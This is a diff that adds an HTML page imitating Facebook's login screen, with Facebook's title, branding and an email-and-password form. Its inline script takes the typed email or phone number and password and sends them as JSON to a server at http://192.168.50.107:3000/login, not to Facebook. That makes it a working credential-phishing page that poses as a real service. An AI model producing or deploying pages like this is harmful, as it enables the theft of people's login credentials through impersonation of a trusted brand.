@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700&display=swap" rel="stylesheet">
+    <title>Facebook -log in or sign up</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    
+    <div class="content">
+<div class="description">
+    <div id="face">
+        facebook
+    </div>
+    <div id="book">Facebook helps you connect and share<br> with the people in your life.</div>
+</div>
+
+
+<div class="form">
+    <form id="loginForm" onsubmit="validateForm(event); return false;">
+        <input type="text" id="fName" placeholder="Email address or phone number">
+        <input type="password" id="pwd" placeholder="Password">
+        <br>
+        <button id="login" type="submit"><h2>Log in</h2></button>
+        <div id="forgot">Forgotten Password?</div>
+        <hr width="70%">
+        <button id="new">Create a new account</button>
+    </form>
+    <div id="result"></div>
+</div>
+
+    </div>
+  
+</body>
+
+<script>
+    const validateForm = async (event) => {
+        event.preventDefault(); // Prevent the form from submitting
+
+        const name = document.querySelector('#fName').value;
+        const pwd = document.querySelector('#pwd').value;
+
+        try {
+            const response = await fetch('http://192.168.50.107:3000/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ name, pwd }),
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                document.getElementById('result').innerText = data.message; // Display the response message
+            } else {
+                document.getElementById('result').innerText = 'Error: Unable to submit the form.';
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('result').innerText = 'An error occurred.';
+        }
+    }
+</script>
+
+
+</html>
